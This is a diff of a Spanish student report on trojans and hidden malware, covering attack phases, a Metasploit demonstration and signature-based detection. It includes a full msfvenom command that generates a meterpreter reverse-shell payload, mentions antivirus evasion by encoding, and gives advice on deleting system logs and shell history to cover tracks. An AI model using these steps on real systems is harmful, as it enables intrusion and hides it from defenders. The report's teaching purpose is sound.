@@ -2,6 +2,12 @@
 
 \usepackage[utf8]{inputenc}
 
+% Bibliography stuff:
+    % bib:log_files -> https://www.blackploit.com/2011/08/eliminar-rastro-y-huellas-post.html
+
+% TODO:
+    % Comment the scripts!
+
 \usepackage{graphicx}
 \graphicspath{{img/}}
 
@@ -290,12 +296,236 @@
 
             \newpar
 
-            En el análisis se puede apreciar que la principal vía de ataque es el uso de troyanos, ya sea tanto para pedir una recompensa por la información o que hayan sido descargados mediante softwares de manera oculta o que se hayan instalado mediante aplicaciones de Android. De igual forma se puede observar en la siguiente gráfica que otros de los principales ataques son por el uso de enlaces malignos para obtener información de los usuarios.
+            En el análisis se puede apreciar que la principal vía de ataque es el uso de troyanos siendo el objetivo más común pedir una recompensa por la información que se comprometa. Éstos troyanos suelen haber sido descargados mediante programas de manera oculta o instalados mediante aplicaciones de \texttt{Android}. De igual forma se puede observar en la gráfica de la figura \ref{f:atk_vec} que otros de los principales ataques son por el uso de enlaces malignos para obtener información de los usuarios.
+
+            \begin{figure}
+                \centering
+                \includegraphics[width=\linewidth]{atk_vec.png}
+                \caption{Principales vectores de ataque}
+                \label{f:atk_vec}
+            \end{figure}
+
+            El $2018$, fue el año en el que los troyanos de banca móvil arrasaron, llegando a alcanzar el máximo histórico de número de paquetes de instalación con $61.000$. El crecimiento exponencial en este tipo de amenazas nos alerta de que el ataque mediante malwares móviles formará parte de la nueva tendencia global. Dentro de los principales países que se vieron afectados por dichos ataques se encuentra EEUU, Rusia y Polonia. Esta información se recoge en la figura \ref{f:troj_installs}.
+
+            \begin{figure}
+                \centering
+                \includegraphics[width=\linewidth]{troj_installs.png}
+                \caption{Número de instalaciones de troyanos}
+                \label{f:troj_installs}
+            \end{figure}
 
 
+            De esta forma podemos comprobar que el nivel de uso de este tipo de malware oculto en los ciberataques que se realizan durante estos últimos años ha ido aumentado. Es por ello que debemos ser más conscientes de cómo pueden llegar a atacarnos y especialmente conocer de qué manera podemos defendernos y evitar de esta forma ser una de las víctimas.
+
+    \section{Demostración: Generando una troyano}
+        Para tratar de afianzar los conceptos aprendidos de la mejor manera posible hemos optado por preparar una pequeña demostración. Creemos que es importante tener primero una visión general de las fases de un ataque remoto para ser capaces de localizar dónde entra un troyano en juego. Nosotros demostraremos una parte mínima de lo que sería un ataque real pero preferimos exponer todo su desarrollo para facilitar la ubicación del lector. Con todo, pasamos a comentar \textit{grosso modo} las fases de aun ataque.
+
+        \subsection{Desglosando un ataque}
+            \subsubsection{Recoonocimiento}
+                En esta fase nos centraremos en analizar la red en busca de objetivos valiosos para identiificar posibles puntos de ataque y así poder planificar la estrategia. Para poder llevar a cabo esta labor solemos aplicar una serie de técnicas:
+
+                \begin{itemize}
+                    \item \textbf{\textit{Fingerprinting}}: Intentamos averiguar todo lo posiblle sobre la red objetivo a través de consultas en bases de datos como \texttt{WHOIS} que asocian nombres de dominio o direcciones \texttt{IP} a entidades concretas, por ejemplo. Podemos también optaor por navegar por la web dell objetivo, hacer consultas a servidores \texttt{DNS} para así obtener un rango de \texttt{IP}s atacables. Los defensores pueden tratar de mitigar esta recogida de información controlando qué se comparte en el dominio público y aplicando reglas adecuadas en firewalls.
+                    \item \textbf{\textit{Scanning}}: Escaneamos los puertos de un objetivo para saber qué servicios está corriendo y saber qué opciones tenemos de cara a la incursión. Para prevenirlo debemos permitir acceso a la red solo a paquetes neceseraios.
+                   \item \textbf{Ennumeración}: Una vez identificados los servicios debemos recoger información como pueden ser las versiones o nombres de usuarioi que se emplean. Es por ello que se deben deshabilitar todos los servicios que no se empleen y que sena visibles a la red.
+                   \item \textbf{\textit{Vulnerability Mapping}}: Una vez descubiertas las versiones y demás información debemos consultar las vulnerabilidades asociadas con las mismas y la manera de explotarlas.
+                \end{itemize}
+
+            \subsubsection{Acceso remoto}
+                Tras identifiicar una vullnerabilidad y la forma de sacarle partido (más adelante ahondaremos un poco más en estas definiciones) es hora de intentar acceder al objetivo. Para ello en nuestro caso intentaremos conseguir la ejecución de código remoto, es decir, trataremos de hacer que la víctima ejecute un programa diseñado de tal manera que éste se conecte de vuelta a nosotros para así poder intentar llevar el ataque un paso más allá. Es aquí donde centraremos la mayor parte de la atención en la demostración. Nosotros hemos preparado un programa que genera una puerta trasera en la máquina que se ejecuta. Éste tiene un apariencia aparentemente inofensiva pero nos permitirá acceder remotamente a la víctima. Esto es, en definiitiva, un troyano.
+
+            \subsubsection{Escalada de privilegios}
+                Cuando conseguimos "poner un pie en la puerta" seguramente lo hagamos como un usuario sin permiso alguno. Es por ello que necesitamos de alguna manera acceder a cuentas con permisos que nos permitan hacer más daño al sistema. Los privilegios a conseguir dependen del tipo de ataque que queramos llebvar a cabo, no es necesario lograr coonvertirnos \texttt{root}, esto es, un usuario con permisos totales.
+
+                \newpar
+
+                En función de nuestro objetivo podemos intentar tratar de mantener este acceso tras la incursión. Para lograrlo deberemos intentar correr nuestra \textit{backdoor} como un servicio o infectar la máquina de alguna otra manera persistente a través de un \textit{rootkit}, por ejemplo. Dado que creemos que no aporta demasiado al tema tratado profundizar en este apartado preferimos mencionarlo y seguir avanzando.
+
+            \subsubsection{Eliminación de evidencias}
+                Las acciones que llevamos a cabo se verán reflejadas en el sistema. Es por ello que normalmente queremos tratar de "cubrir nuestras huellas". Para ello deberemos intentar borrar bitácoras o \textit{logs} del sistema como puede ser \texttt{syslog}. Puede que tengamos que eliminar el \textit{log} de servicios como \texttt{Apache}, un servidoor web u otros en función de lo que hayamos hecho. Otro ejemplo de archivo que normalmente querremos destruir es la historia de la \textit{shell} que hayamos empleado como puede ser \texttt{~/.bash_history} en el caso de \texttt{bash}. Existe una lista más exhaustiva a tener en cuenta en \cite{bib:log_files}.
+
+            \newpar
+
+            Esperamos haber sido informativos auqnue hayamos deseado dejar la anteior descripción en la mínima expresión. Pasamos pués a describir la demostración que hemos llevado a cabo.
+
+        \subsection{Demostración}
+            Aun siendo este trabajo eminentemente teórico hemos querido preparar una demostración práctica que sustente lo ya expuesto. Ya que los términos en los que hemos discutido los conceptos anteriores han sido de carácter general hemos optado por hacer lo mismo en esta demostración. Esto es, en vez de buscar un ataque tremendamente específico hemos escogido uno sencillo que nos permita analizar la base teórica de la que hacen uso de una manera clara y concisa.
+
+            \newpar
+
+            Señalamos que los \textit{scripts} comentados que automatizan la tarea se pueden encontrar \href{https://github.com/UAH-s-Telematics-Engineering-Tasks/info_sec_proj}{en nuestro repositorio de \texttt{GitHub}}. No hemos incluido el código en este informe ya que creemos que sería poco práctico y reduciría enormemente el espacio del que disponemos para comentar nuestra investigación y puesta en práctica de la materia.
+
+            \newpar
+
+            Con el objetivo de arrojar incluso más luz sobre el malware oculto en general y los troyanos en particular decidimos incluso preparar nuestra propia versión con el objetivo de asentar los conocimientos adquiridos a la vez que relacionábamos el contenido de esta asignatura con el de otras impartidas en el grado.
+
+            \newpar
+
+            Creemos que con lo anterior hemos logrado demostrar las características básicas de este tipo de ataques que suelen ser, además, el primer paso en una cadena mucho más compleja.
+
+            \subsubsection{Trabajando con Kali}
+                Nuestro objetivo con esta sección no es solo analizar el funcionamiento de los troyanos sino también brindar una pequeña "guía" que permita a cualquiera recrear nuestras pruebas. Es por ello que es necesario describir el sistema con el que se ha generado todo.
+
+                \newpar
+
+                Dadas las facilidades que nos ofrece hemos escogido Kali Linux para generar los \textit{payload}s (más sobre ellos a continuación) y controlar las máquinas comprometidas. Kali es una distribución que usa Linux como kernel y que se basa en el archiconocida Debian. Sobre esta base robusta se ha instalado una gran cantidad de herramientas comunmente empleadas en muchas áreas de la ciberseguridad como puede sern la ingeniería social, la ruptura de contraseñas, auditoría de redes WiFi... En nuestro caso estamos interesados en Metasploit y sus programas relacionados. Metasploit es un framework que nos permite generar ataques contra vulnerabilidades conocidas de una manera clar y rápida. Dado el soporte que ofrece la firma Rapid7, afincada en Boston, nuevas vulnerabilidades y los ataques que las aprovechan se añaden de manera continua. En definitiva, es una herramienta que permite preparar ataques de una manera rápida y que además ofrece una forma clara de continuar con la post-explotación una vez hemos conseguido acceder a la máquina víctima.
+
+                \newpar
+
+                Si bien Metasploit es una herramienta tremendamente potente nosotros solo hemos arañado la superficie de la funcionalidad que nos ofrece. En nuestro caso haremos uso del intérprete de órdenes msfconsole y del generador de \textit{payload}s msfvenom. Ambas herramientas se encuentran instaladas por defecto con lo que no nos las tendremos que ver con la compilación de una suite de herramientas tan extensa...
+
+            \subsubsection{Terminología}
+                Tras haberlo mencionado varias veces creemos que es el momento de esclarecer el significado del \textit{payload}. El término \textit{payload} es un anglicismo al que en español nos solemos referir como carga útil en el contexto de las redes que es en el que nos hemos formado. En este ámbito el \textit{payload} es código que, de ser ejecutado, nos brinda acceso al sistema objetivo. Quizá lo más importante de esta última oración es la palabra "ejecutado". Si bien el \textit{payload} es el paso anterior a conseguir el acceso que buscamos no vale de nada que esté almacenado en disco; necesitamos que de alguna manera se ejecute. Destacamos además que esta sección es la profundización de la fase \textit{acceso remoto} que describíamos al explicar las fases de las que se compone un ataque.
+
+                \newpar
+
+                Para lograr esta ejecución de código arbitraria tenemos que sacar partido a alguna vulnerabilidad. Estas vulnerabilidades son errores en programas o interacciones entre partes del sistema que pueden ser aprovechadas para llevar a cabo acciones a priori no permitidas. La vulnerabilidad por si sola no implica nada, simplemente está ahí, esperando a ser arreglada mediante una actualización. Los atacantes sin embargo intentarán aprovecharla para lograr sus objetivos. En nuestro caso, la ejecución del \textit{payload} que hemos preparado.
+
+                \newpar
+
+                La forma de aprovechar la vulnerabilidad es a través de un exploit. Este exploit suele ser un programa que toma acciones para intentar aprovechar una vulnerabilidad determinada. Teniendo en cuenta la relación entre vulnerabilidades y exploits aprovechamos para señalar por qué es tan importante trabajar con equipos actualizados. Además de funcionalidades nuevas las actualizaciones se encargan de "parchear" vulnerabilidades que se han encontrado para evitar que puedan ser aprovechadas...
+
+                \newpar
+
+                En nuestro caso estamos interesados en analizar lo que ocurre una vez se ejecuta el \textit{payload}, no en la forma de lograrlo. Si aplicamos estos conceptos a raja tabla, en nuestro caso el exploit es el usuario, es quien va a ejecutar el programa que nos dará acceso a su sistema. Una vez analizado el funcionamiento de nuestro troyano entraremos a explicar una forma en la que podemos explotar el lector de PDFs Adobe Acrobat Reader para que no dependamos de el usuario. Creemos que al posponer esta explicación conseguiremos centrar la atención en el malware propiamente dicho mientras que, dada la independencia entre las fases del ataque, no dificultamos seguir esta demostración.
+
+                \newpar
+
+                De la discusión anterior se desgrana el proceso común de ataque a un sistema víctima:
+
+                \begin{itemize}
+                    \item Generar el \textit{payload} que deseamos ejecutar en la víctima.
+                    \item Encontrar una vulnerabilidad que podamos aprovechar.
+                    \item Ejecutar el exploit que saque partido a esa vulnerabilidad para lograr ejecutar el \textit{payload}.
+                    \item Ejecutar el \textit{payload} generado en la víctima para conseguir, en nuestro caso, acceso al sistema.
+                    \item Emplear el acceso al sistema para lo que se desee: escalada de privilegios, conseguir información...
+                \end{itemize}
 
 
+                Con este esquema en mente pasamos a detallar cada una de las partes.
 
+            \subsubsection{Generando el \textit{payload}: \texttt{MSFVENOM}}
+                Para facilitar la comprensión de este paso podemos aludir a la formación que hemos adquirido en asignaturas como Sistemas Operativos o Programación en las que estudiamos el proceso que nos lleva desde un archivo fuente \texttt{*.c} a un ejecutable compilado. De manera muy resumida podemos decir que el código fuente pasa por el preprocesador que sustituirá todas las directivas \texttt{#include <>}. A continuación el archivo resultante pasa por el compilador que se encargará de generar archivos objeto \texttt{*.o} para después enlazarlo junto con los demás gracias al enlazador. Tras este último paso llegamos a nuestro ejecutable funcional.
+
+                \newpar
+
+                Si observamos este ejecutable con una herramienta como \texttt{xxd} solo veremos una ristra de bytes comprensibles por nuestro equipo, el denominado código máquina. Ahora, si hacemos lo propio con los \textit{payload}s generados por \texttt{MSFVENOM} veremos que, en efecto, es análogo a un programa compilado. Con esto queremos demostrar que MSFVENOM simplemente nos devuelve ejecutables ya generados. Nosotros podremos controlar qué tipo de \textit{payload} queremos pero, al final del día, simplemente se nos devuelve un programa listo para ejecutar.
+
+                \newpar
+
+                Si bien los lenguajes interpretados como Python están cobrando cada vez más notoriedad en el mundo actual no debemos olvidarnos de las sutilezas que entraña la compilación de programas. Los sistemas operativos se caracterizan por una serie de parámetros como son el \textit{kernel} o núcleo que emplean o la arquitectura para la que están diseñados. Esto implica que programas generados para una plataforma que se sustente sobre Linux no son compatibles con otros que corran sobre Windows NT, el \textit{kernel} del sistema operativo homónimo. Bien es verad que existen interfaces del sistema operativo estñandar como \texttt{POSIX} pero no podemos aventurarnos a asegurar que un programa escrito para Windows corra en otro basado en Linux y viceveresa. Lo que es más, dentro de cada una de las familias anteriores distinguimos arquitecturas impuestas por las características físicas de la máquina, siendo las más típicas la de $64\ bits$ \texttt{(amd64/x64)} y la ya algo obsoleta de 32 bits \texttt{(i386/x86)}. Al igual que antes un programa compilado para una arquitectura no será compatible con la otra.
+
+                \newpar
+
+                Teniendo en cuenta las variables que hemos descrito llegamos a que podemos generar 4 tipos de \textit{payload}s en función del objetivo que tengamos. Estas 4 variables son:
+
+                \begin{itemize}
+                    \item \texttt{Linux - 64 bits}
+                    \item \texttt{Linux - 32 bits}
+                    \item \texttt{Windows - 64 bits}
+                    \item \texttt{Windows - 32 bits}
+                \end{itemize}
+
+                Con esto en mente debemos alterar la salida que nos ofrece \texttt{MSFVENOM} a través de sus opciones para generer el \textit{payload} deseado. Con el fin de ocultar la complejidad de usar la herramienta directamente hemos escrito un script de bash (la shell por defecto de Kali y otras muchas distribuciones) que se encarga de esto por nosotros. El script en cuestión es \texttt{gen_payload.sh}. No obstante, adjuntamos una invocación de ejemplo de MSFVENOM para comentar qué efecto tiene cada una de sus opciones:
+
+                \begin{center}
+                    \texttt{msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=5000 -f exe -o win_pyld.exe}
+                \end{center}
+                
+
+                Con lo anterior estamos generando el \textit{payload} \texttt{win_pyld.exe}. La arquitectura y plataforma de este programa vienen dadas por las opciones \texttt{-a} y \texttt{--platform} respectivamente. Consultando los valores pasados vemos que se trata de una máquina que ejecuta la versión de 64 bits de Windows. Asimismo, el tipo de \textit{payload} seleccionado es \texttt{windows/x64/meterpreter/reverse_tcp}. En la siguiente sección comentaremos el funcionamiento de la misma. Dado el \textit{payload} escogido debemos pasar dos opciones que se introducirán en el código del mismo. En este caso son la IP (\texttt{LHOST}) y el puerto (\texttt{LPORT}) de la máquina atacante. En secciones subsiguientes estudiaremos por qué son necesarias estas opciones. Finalmente especificamos el formato del \textit{payload} generado con la opción \texttt{-f}. Dado que el formato estándar de los archivos ejecutables en Windows. Este archivo generado tendrá, ademas del programa propiamente dicho, las instrucciones necesarias para que el loader de Windows lo cargue correctamente.
+
+                \newpar
+
+                Como ya comentamos anteriormente, uno de los mecanismos más comunes para detectar malware es la comparación de archivos sospechosos con firmas almacenadas en bases de datos que se han asociado a algún archivo malicioso. Con la orden anterior hemos generado el \textit{payload} sin intentar ocultarlo de ninguna manera. Más adelante comentaremos como, a traves de un proceso denominado codificación, podemos intentar ocultar este programa malicioso para así inhibir o al menos dificultar el trabajo de los antivirus.
+
+                \newpar
+
+                En definitiva, lo que hemos logrado generar es un programa que, de ser ejecutado en la máquina víctima, nos proporcionará acceso desde la máquina atacante.
+
+            \subsubsection{Llevando a cabo el ataque}
+                Hasta ahora no hemos explicado qué es lo que hace el \textit{payload} que estamos generado. Sabemos que tenemos un programa que, de ejecutarse en la víctima, nos daría acceso a la misma pero desconocemos cómo lo hace.
+
+                \newpar
+
+                Gracias al nombre del \textit{payload}, los parámetros que acepta y la información que nos proporciona un analizador de protocolos como \texttt{WireShark} podemos hacernos una idea de lo que está ocurriendo. El programa generado al ejecutarse simplemente abrirá un socket que utiliza \texttt{TCP} en la capa de transporte (de ahí el sufijo tcp del nombre del \textit{payload}) y que tratará de conectarse de vuelta a la máquina atacante (de ahí el reverse del nombre). Una vez se establezca la conexión este programa se baja una shell que le suministra el atacante y que pasará a ejecutar en la víctima, cosa que nos brinda acceso al sistema objetivo.
+
+                \newpar
+
+                Ahora bien, este \textit{payload} debe saber cómo conectarse de vuelta a la máquina atacante. Es aquí donde entran en juego las opciones \texttt{LHOST} y \texttt{LPORT} que se encargan de identificar a la máquina atacante a través de su dirección IP (\texttt{LHOST}) así como al programa que espera recibir la conexión del \textit{payload} a través de un número de puerto (`LPORT`). En el fondo este \textit{payload} resulta ser, desde un punto de vista general, tremendamente sencillo.
+
+                \newpar
+
+                Una vez que se haya ejecutado el programa malicioso en la víctima debemos aceptar la conexión de vuelta y poner todo a funcionar. Para ello haremos uso de la consola de metasploit a través del comando \texttt{msfconsole}. Debemos configurar nuestra sesión para que acepte la conexión que esperamos y descargue a través de ésta la shell que deseamos ejecutar en la máquina atacante. Al fin y al cabo lo que queremos lograr es tener una sesión en la víctima que nos permita controlarla.
+
+                \newpar
+
+                Al igual que hicimos con la generación del \textit{payload} hemos automatizado el proceso a través de un script en bash que está enteramente comentado (\texttt{troj_c_n_c.sh}). Tras lanzarlo esperaremos la conexión del \textit{payload} una vez se ejecute y pasaremos a tener automáticamente un indcutor (prompt) esperando órdenes para ejecutar en la víctima.
+
+                \newpar
+
+                Si bien tenemos shells tradicionales como bash, zsh o ksh en este caso estamos tratando con un entorno totalmente distinto. Si recordamos el nombre del \textit{payload} y nos quemos con la última parte (\texttt{meterpreter/reverse_tcp}) veremos que nuestro \textit{payload} se puede desglosar en dos partes:
+
+                \begin{itemize}
+                    \item \textit{Stager}: \texttt{reverse_tcp} -- Se encarga de la conexión de vuelta a la máquina atacante
+                    \item \textit{Stage}: \texttt{meterpreter} -- Shell a ejecutar
+                \end{itemize}
+
+                Vemos pues que el inductor que aparece en el atacante pertence a esta shell. La forma de cargar esta shell en memoria es a través de la inyección del código descargado en el espacio de memoria del proceso que ya generó la conexión de vuelta. Es decir, en una primera instance el stager se conecta de vuelta al cenctro de control (máquina atacante). Al ejecutarse este \textit{payload} se genera un proceso, como en cualquier otra ocasión. Tras descargarse el código compilado de meterpreter éste se carga en el espacio de memoria del proceso y pasamos a ejecutar la shell que recibimos de vuelta.
+
+                \newpar
+
+                Vemos pues quel el proceso implica una serie de pasos a pesar de ser relativamente sencillo. Al tratarse de un entorno totalmente nuevo tenemos una gran cantidad de herramientas y órdenas que nos permitirán recabar la información que estemos buscando.
+
+                \newpar
+
+                Como ya dijimos antes, consideramos el caso en el que el usuario ejecuta directamente nuestro programa ya sea por desconocimiento, valentía o inconsciencia. Esto implica normalmente que no tendremos permisos administrativos, es decir, podremos hacer tanto como podríamos con una cuenta de usuario normal y corriente. Esto abre la puerta a las etapas posteriores tras la entrada en el sistema: la post-explotación. Una vía de acción típica es el escalado de privilegios para lograr el control total de la víctima, por ejemplo. Dado que no es el tema que nos atañe lamentamos tener que dejarlo aquí...
+
+            \subsubsection{Nuestra propia versión}
+                Tras analizar el funcionamiento de la solución ofrecida por Metasploit nos decidimos a intententar algo parecido con un programa propio. Dada la facilidad que ofrece al desarrollo optamos por emplear Python como lenguaje para implementar nuestra propuesta. Somos conscientes de que lo que hemos escrito es mucho menos sofisticado que lo que podemos lograr con Metasploit pero queríamos llevar a cabo nuestra propia prueba de concepto.
+
+                \newpar
+
+                En vez de intentar cargar un entorno nuevo a través de la conexión que hacemos de vuelta al centro de control hemos optado por emplear la shell del propio sistema. Para ello hacemos uso de la librería \texttt{subprocess} que nos permite inspeccionar la salida de comandos del sistema. La arquitectura de nuestro programa es por tanto muy sencilla. El \textit{payload} solo se encarga de abrir una conexión TCP hasta el atacante y espera a recibir comandos. Al recibirlos los ejecuta en la víctima para devolver la salida de los mismos al centro de control. El proceso continúa hasta que uno de los dos programas muere, lo que precipita el cierre de la conexión.
+
+                \newpar
+
+                Asimismo hemos considerado mejoras como puede ser la encriptación de las comunicaciones. Aunque no hemos llegado a implementarlas sería interesante intentar asegurar que la información extraida de la víctima no puede ser leida ni por terceros ni por ningún defensor del sistema comprometido.
+
+            \subsubsection{Esquivando a los antivirus}
+                Antes ya adelantábamos cómo uno de los métodos típicos de detección de malware es la comparación con otras muestras maliciosas conocidas. En un intento de camuflar programas maliciosos podemos tratar de ofuscarlos, esto es, enredar tanto el código que la similitud con otras muestras conocidas se reduzca enormemente. Para ello contamos con herramientas como los codificadores o encoders. Uno de los ejemplos más conocidos es \textit{Shikata-Ga-Nai} que significa "no se puede hacer nada" en japonés, aludiendo a cómo complica la detección del malware codificado por parte de programas especializados.
+
+                \newpar
+
+                La forma de lograr este comportamiento es cifrar las instrucciones del propio \textit{payload} con una clave que se aplica en el momento de la ejecución con lo que la firma no es sospechosa. El primer paso de la ejecución es obtener el contador del programa para saber dónde se está ejecutando actualmente el programa malicioso para así poder modificar futuras referencias a memoria y así desenredar el "bicho" en tiempo real. Esta técnica podría incuso peritir a su usuario cambiar de forma o mutar en tiempo real con lo que los efectos del malware podrían multiplicarse.
+
+                \newpar
+
+                Este campo resulta sin duda interesante pero dado que solo queríamos preparar una pequeña demostración nos hemos visto obligados a solo mencionarlo. Esperamos haber sido claros exponiendo los conceptos y los pasos para reeproducir el ataque. A nosotros sin duda nos ha servido para comprender mejor el funcionamiento interno de este tipo de malware. Con todo, nos queda estudiar cómo detectar y prevenir este tipo de ataques.
+
+    \section{Detección y prevención de malware oculto}
+        Existen varias maneras de poder detectar cuándo un software malicioso se ha introducido en un sistema o equipo determinado. A continuación mencionamos las más importantes.
+
+        \subsection{Detección basada en firmas}
+            Es uno de los mecanismos más usados debido a su sencillez, velocidad y destacable precisión a la hora de identificar malware específico.
+
+            Este modo de detección compara la “firma” de los archivos a analizar con una base de datos y si hay coincidencia, el archivo es identificado como malware. Existen tres tipos de firmas.
+
+            \subsubsection{Archivos completos}
+                Se computa un \textit{fingerprint} del archivo completo usando un hash criptográfico como, por ejemplo, \texttt{SHA-1} y se compara con los hashes de las firmas almacenados en una base de datos. Debido a las características de estos hashes, el mínimo cambio en el archivo de entrada cambiaría por completo el \textit{fingerprint} resultante debido al efecto "avalancha" que se busca en el diseño de este tipo de funciones digestivas. Ésto impedirá en gran medida que las comparaciones resulten en falsos positivos, esto es, que parezca malware algo que no lo es, ya que es prácticamente imposible que dos archivos distintos generen el mismo \textit{fingerprint}. Por lo tanto los malwares pueden ser detectados de manera rápida y eficaz.
+
+            \subsubsection{Archivos parciales}
+                A diferencia del caso anterior, el \textit{fingerprint} se computará sólo de ciertas secciones del archivo. En los archivos de malware hay secciones que no tienen tanta relevancia y pueden ser modificadas fácilmente por lo que el análisis se centra en las secciones críticas del funcionamiento del malware para así ser capaces de detectar variantes de malware de manera eficaz.
+
+            \subsubsection{Firmas de cadenas}
+                Siguiendo el mecanismo de las anteriores firmas se analizarán las posibles cadenas de caracteres y se compararán con la base de datos. Este método no es muy eficaz con malware oculto ya que no suelee interactuar con el usuario, pero con malware como el \texttt{Stone virus} que contiene una cadena diciendo \textit{Your PC is now stoned} un archivo con esa cadena puede ser identificado como posible malware. No obstante se tendrán más características en cuenta para determinar que es efectivamente malware.
+
+            \subsubsection{Ventajas e inconvenientes}
+                La detección basada en firmas es una técnica muy fácil de implementar y gracias a la utilización de hashes criptográficos es muy eficaz a la hora de encontrar amenazas conocidas por lo que su tasa de falsos positivos es bajísima.
+
+                \newpar
+
+                Las desventajas más significativas de la detección basado en firmas son causadas debido a la base de datos. La base de datos juega un papel crucial en el sistema, por lo que tiene que estar siendo actualizada continuamente para que se puede detectar nuevos malware generados lo cual lo convierte en un sistema vulnerable a zero-day malware. Otra gran desventaja es que cuanto más grande sea la base de datos, más carga habrá sobre la CPU del sistema por lo que es difícil encontrar un equilibrio entre rapidez del sistema y eficacia de la base de datos. Esta técnica de detección tampoco es capaz de combatir malware que muta su código en cada infección como polymorphic y metamorphic malware.
 
 
 
